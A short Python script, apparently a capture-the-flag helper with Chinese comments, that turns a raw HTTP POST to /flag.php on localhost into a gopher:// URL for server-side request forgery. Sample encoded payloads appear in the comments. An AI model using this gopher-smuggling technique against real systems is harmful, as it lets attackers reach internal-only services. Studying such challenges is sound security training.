payload =\
"""POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

givemeflag=yes
"""

# 注意后面一定要有回车，回车结尾表示http请求结束
new = payload.replace(' ', '%20')
new = new.replace('\n', '%0d%0a')
# new = tmp
result = 'gopher://127.0.0.1:80/'+'_'+ new
print(result)
# 这里因为是GET请求所以要进行两次url编码
# gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2014%0d%0a%0d%0agivemeflag=yes%0d%0a
# gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2014%0d%0a%0d%0agivemeflag=yes%0d%0a